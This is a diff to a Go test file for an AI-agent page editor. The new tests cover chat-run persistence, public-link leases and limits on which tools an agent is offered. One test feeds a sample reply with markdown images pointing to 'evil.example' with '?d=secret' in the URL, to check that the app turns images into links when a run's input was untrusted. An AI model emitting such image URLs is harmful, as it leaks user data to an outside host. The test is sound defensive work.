@@ -2,11 +2,14 @@ package agents
 
 import (
 	"context"
+	"encoding/json"
+	"fmt"
 	"io"
 	"net/http"
 	"net/http/httptest"
 	"slices"
 	"strings"
+	"sync"
 	"sync/atomic"
 	"testing"
 	"time"
@@ -490,7 +493,7 @@ func TestChatHistoryLeavesOutUndoneAndFailedRuns(t *testing.T) {
 	}
 	var got []string
 	for _, turn := range chatHistory(s) {
-		got = append(got, turn["role"]+": "+turn["content"])
+		got = append(got, turn.Role+": "+turn.Content)
 	}
 	want := "user: Summarize|assistant: It is a plan.|user: Hello|assistant: Hi."
 	if strings.Join(got, "|") != want {
@@ -1184,5 +1187,275 @@ func TestCommentRunReadsItsThread(t *testing.T) {
 	}
 	if h.thread(p.ID, "") != nil {
 		t.Error("a run on no comment has a thread")
+	}
+}
+
+// A sidebar run keeps its ops as they come for a launch that ends during
+// it: the first op saves the chat, which has the run, and the next ones
+// the run alone, which the next launch puts back in its chat; the run's
+// end keeps the chat whole, and the run alone no more.
+func TestChatKeepsTheRunningRunAlone(t *testing.T) {
+	st := openStore(t)
+	p, ed := openPage(t, st)
+	h := NewHub(st, nil, openHost{ed: ed})
+	s := h.Session(p.ID)
+	local := Option{Provider: store.Provider{ID: "ollama", Name: "Ollama", IsLocal: true}}
+	run := &Run{ID: "r1", AgentName: "Ollama", Instruction: "Add lines", Status: "running"}
+	reply := &Message{Text: "Reading the page…", Pending: true, RunID: run.ID}
+	s.Runs = append(s.Runs, run)
+	s.Messages = append(s.Messages, &Message{Mine: true, Text: "Add lines"}, reply)
+	o := RunOptions{Surface: "sidebar", Instruction: "Add lines", Reply: reply}
+	before := ed.Content.Copy()
+	d := h.newDelivery(p.ID, run, local)
+	h.arrived(s, run, local, before, d, o, insertAfter("p1", "x1", "one"), "Added a line")
+	chat, _ := st.Value(chatKey(p.ID))
+	for i, id := range []string{"x2", "x3"} {
+		d.chatSaved = d.chatSaved.Add(-chatSaveEvery)
+		h.arrived(s, run, local, before, d, o, insertAfter([]string{"x1", "x2"}[i], id, "more"), "Added a line")
+	}
+	if now, _ := st.Value(chatKey(p.ID)); now != chat {
+		t.Error("the chat was saved whole again while the run worked")
+	}
+	if _, ok := st.Value(runningKey(p.ID)); !ok {
+		t.Fatal("the running run is not kept")
+	}
+	// The app quits here, mid-run.
+	restored := NewHub(st, nil, stubHost{}).Session(p.ID).Run("r1")
+	if restored == nil || len(restored.Ops) != 3 || len(restored.Edits) != 3 {
+		t.Fatalf("restored run %+v", restored)
+	}
+	if _, ok := st.Value(runningKey(p.ID)); ok {
+		t.Error("the running run stays kept once its chat has it")
+	}
+
+	run2 := &Run{ID: "r2", AgentName: "Ollama", Instruction: "Add more", Status: "running"}
+	reply2 := &Message{Text: "Reading the page…", Pending: true, RunID: run2.ID}
+	s.Runs = append(s.Runs, run2)
+	s.Messages = append(s.Messages, &Message{Mine: true, Text: "Add more"}, reply2)
+	o2 := RunOptions{Surface: "sidebar", Instruction: "Add more", Reply: reply2}
+	d2 := h.newDelivery(p.ID, run2, local)
+	h.arrived(s, run2, local, ed.Content.Copy(), d2, o2, insertAfter("x3", "y1", "one"), "Added a line")
+	d2.chatSaved = d2.chatSaved.Add(-chatSaveEvery)
+	h.arrived(s, run2, local, ed.Content.Copy(), d2, o2, insertAfter("y1", "y2", "two"), "Added a line")
+	h.finish(s, run2, Request{PageID: p.ID, Surface: "sidebar", Instruction: "Add more"}, local, ed.Content.Copy(), d2, Result{Reply: "Added lines."}, nil, o2)
+	if _, ok := st.Value(runningKey(p.ID)); ok {
+		t.Error("the running run stays kept after it ended")
+	}
+	if r := NewHub(st, nil, stubHost{}).Session(p.ID).Run("r2"); r == nil || len(r.Ops) != 2 || r.Status != "done" {
+		t.Errorf("the ended run as kept %+v", r)
+	}
+}
+
+// Each turn of the chat the model reads says whether its run kept to the
+// page, and whether its URL guard was on: a reply whose run is not known
+// did not keep to the page, as keptToPage has it, and was guarded.
+func TestChatHistorySaysWhichTurnsKeptToThePage(t *testing.T) {
+	s := &Session{Runs: []*Run{{ID: "r1", Status: "done", KeptToPage: true}, {ID: "r2", Status: "done", Guarded: true},
+		{ID: "r3", Status: "done", KeptToPage: true, Guarded: true}}}
+	s.Messages = []*Message{
+		{Mine: true, Text: "a"}, {Text: "A", RunID: "r1"},
+		{Mine: true, Text: "b"}, {Text: "B", RunID: "r2"},
+		{Mine: true, Text: "c"}, {Text: "C"},
+		{Mine: true, Text: "d"}, {Text: "D", RunID: "r3"},
+	}
+	var got []string
+	for _, turn := range chatHistory(s) {
+		got = append(got, fmt.Sprintf("%s:%v:%v", turn.Content, turn.KeptToPage, turn.Guarded))
+	}
+	if want := "a:true:false A:true:false b:false:true B:false:true c:false:true C:false:true d:true:true D:true:true"; strings.Join(got, " ") != want {
+		t.Errorf("history %v", got)
+	}
+}
+
+// A reply put in the page of a run whose URL guard was on, or that read
+// beyond its page, or one not known, has its pictures as links to them,
+// nested ones too: the app would load a picture by itself. A run that
+// kept to its page, and read no web, has them as pictures.
+func TestReplyBlocksKeepPicturesToRunsThatKeptToThePage(t *testing.T) {
+	reply := "See:\n\n![Chart](https://evil.example/c.png?d=secret)\n\n- item\n  ![](https://evil.example/d.png)"
+	kinds := func(nodes []*doc.Node) string {
+		var out []string
+		for _, n := range nodes {
+			walk(n, func(k *doc.Node) { out = append(out, k.Type) })
+		}
+		return strings.Join(out, " ")
+	}
+	if got := kinds(ReplyBlocks(reply, &Run{KeptToPage: true})); got != "paragraph image bulleted_list image" {
+		t.Errorf("a run kept to its page: %s", got)
+	}
+	for name, run := range map[string]*Run{"guarded": {KeptToPage: true, Guarded: true}, "beyond": {}, "unknown": nil} {
+		nodes := ReplyBlocks(reply, run)
+		if got := kinds(nodes); got != "paragraph paragraph bulleted_list paragraph" {
+			t.Errorf("%s: %s", name, got)
+		}
+		if d := nodes[1].Delta(); d.Plain() != "Chart" || d[0].Attrs.Href != "https://evil.example/c.png?d=secret" {
+			t.Errorf("%s: the picture reads %+v", name, d)
+		}
+		if d := nodes[2].Children[0].Delta(); d.Plain() != "https://evil.example/d.png" {
+			t.Errorf("%s: a picture without words reads %+v", name, d)
+		}
+	}
+}
+
+// leaseServer is a server's REST API as public links use it: a page's
+// lease, live or not by the server's clock, and the leases it gives and
+// ends, in order.
+type leaseServer struct {
+	mu    sync.Mutex
+	live  bool
+	given int
+	calls []string
+}
+
+func (l *leaseServer) ServeHTTP(w http.ResponseWriter, r *http.Request) {
+	l.mu.Lock()
+	defer l.mu.Unlock()
+	if r.URL.Path == "/rest/v1/rpc/lease_public_link" {
+		var args map[string]any
+		_ = json.NewDecoder(r.Body).Decode(&args)
+		if ending, ok := args["p_ending"]; ok {
+			l.calls = append(l.calls, fmt.Sprintf("end %v %v", args["p_page_id"], ending))
+			_, _ = w.Write([]byte(`null`))
+			return
+		}
+		l.given++
+		l.calls = append(l.calls, fmt.Sprintf("renew %v", args["p_page_id"]))
+		_, _ = fmt.Fprintf(w, `"2026-11-05T12:00:00.%06d+00:00"`, l.given)
+		return
+	}
+	// The server's own clock says whether the lease is live, as the
+	// query asks it to.
+	if l.live && strings.Contains(r.URL.RawQuery, "public_link_until=gt.now") {
+		_, _ = w.Write([]byte(`[{"public_link_until":"` + time.Now().Add(time.Hour).Format(time.RFC3339Nano) + `"}]`))
+		return
+	}
+	_, _ = w.Write([]byte(`[]`))
+}
+
+// wait waits for the server to have had n lease calls.
+func (l *leaseServer) wait(t *testing.T, n int) []string {
+	t.Helper()
+	for deadline := time.Now().Add(5 * time.Second); ; time.Sleep(10 * time.Millisecond) {
+		l.mu.Lock()
+		calls := slices.Clone(l.calls)
+		l.mu.Unlock()
+		if len(calls) >= n || time.Now().After(deadline) {
+			return calls
+		}
+	}
+}
+
+// Whether a page has a public link another device serves, the server
+// says by its own clock, which the device asks it to compare with; the
+// server gone, the lease it last gave stands, and none of a page it never
+// said one of.
+func TestPublicLinkAsTheServerSays(t *testing.T) {
+	st := openStore(t)
+	l := &leaseServer{}
+	hs := httptest.NewServer(l)
+	h := NewHub(st, remote.SignedInForTest(hs.URL, st, "u1"), onlineHost{})
+	ctx := context.Background()
+	for _, live := range []bool{false, true} {
+		l.mu.Lock()
+		l.live = live
+		l.mu.Unlock()
+		if got := h.publicElsewhere(ctx, "p1"); got != live {
+			t.Errorf("live %v: public %v", live, got)
+		}
+	}
+	hs.Close()
+	if !h.publicElsewhere(ctx, "p1") || h.publicElsewhere(ctx, "p2") {
+		t.Error("offline, the server's last answer was not kept")
+	}
+}
+
+// Serving a public link renews its lease on the server, which sets its
+// time, and stopping ends the lease it holds. A lease the link started
+// again took, as for other addresses, stands when the older one stops
+// after it began: the older one ends nothing. Signed out, there is none.
+func TestPublicLinkLeases(t *testing.T) {
+	st := openStore(t)
+	l := &leaseServer{}
+	hs := httptest.NewServer(l)
+	defer hs.Close()
+	h := NewHub(st, remote.SignedInForTest(hs.URL, st, "u1"), onlineHost{})
+	stop := h.ServePublicLink("p1")
+	l.wait(t, 1)
+	stop()
+	stop()
+	if calls := l.wait(t, 2); !slices.Equal(calls, []string{"renew p1", "end p1 2026-11-05T12:00:00.000001+00:00"}) {
+		t.Errorf("calls %q", calls)
+	}
+
+	first := h.ServePublicLink("p1")
+	l.wait(t, 3)
+	second := h.ServePublicLink("p1")
+	l.wait(t, 4)
+	first()
+	second()
+	if calls := l.wait(t, 5)[2:]; !slices.Equal(calls, []string{"renew p1", "renew p1", "end p1 2026-11-05T12:00:00.000003+00:00"}) {
+		t.Errorf("with a lease taken again, calls %q", calls)
+	}
+	time.Sleep(100 * time.Millisecond)
+	l.mu.Lock()
+	if len(l.calls) != 5 {
+		t.Errorf("the older lease ended the newer: %q", l.calls)
+	}
+	l.mu.Unlock()
+	NewHub(st, nil, stubHost{}).ServePublicLink("p1")()
+}
+
+// serialHost is a host that lets agents read other pages, and runs its
+// updates one at a time, as the main thread does.
+type serialHost struct {
+	readingHost
+	mu *sync.Mutex
+}
+
+func (h serialHost) Update(_ string, fn func()) {
+	h.mu.Lock()
+	defer h.mu.Unlock()
+	fn()
+}
+
+// A run on this device of a page whose public link another device serves,
+// as the server says as the run starts, is offered none of the user's
+// other pages; one after the link stopped is.
+func TestRunOnAPageLinkedElsewhere(t *testing.T) {
+	st := openStore(t)
+	f := &fakeModel{replies: []map[string]any{{"content": "Hi."}, {"content": "Hi."}}}
+	models := httptest.NewServer(f)
+	defer models.Close()
+	if err := st.PutProvider(store.Provider{ID: "local", Preset: "custom", Name: "Local", BaseURL: models.URL, AuthKind: "none", DefaultModel: "m", IsLocal: true, SupportsTools: new(true)}); err != nil {
+		t.Fatal(err)
+	}
+	p, err := st.CreatePage(store.NewPageOptions{Title: "Plan", Content: page()})
+	if err != nil {
+		t.Fatal(err)
+	}
+	l := &leaseServer{}
+	hs := httptest.NewServer(l)
+	defer hs.Close()
+	h := NewHub(st, remote.SignedInForTest(hs.URL, st, "u1"), serialHost{mu: &sync.Mutex{}})
+	for i, live := range []bool{true, false} {
+		l.mu.Lock()
+		l.live = live
+		l.mu.Unlock()
+		done := make(chan *Run, 1)
+		h.Start(p.ID, RunOptions{Surface: "sidebar", Instruction: "Sum up my notes", Done: func(r *Run) { done <- r }})
+		select {
+		case r := <-done:
+			if r.Status != "done" {
+				t.Fatalf("run %+v", r)
+			}
+		case <-time.After(10 * time.Second):
+			t.Fatal("the run never ended")
+		}
+		f.mu.Lock()
+		raw, _ := json.Marshal(f.requests[i]["tools"])
+		f.mu.Unlock()
+		if offered := strings.Contains(string(raw), `"list_pages"`); offered == live {
+			t.Errorf("linked elsewhere %v: other pages offered %v", live, offered)
+		}
 	}
 }
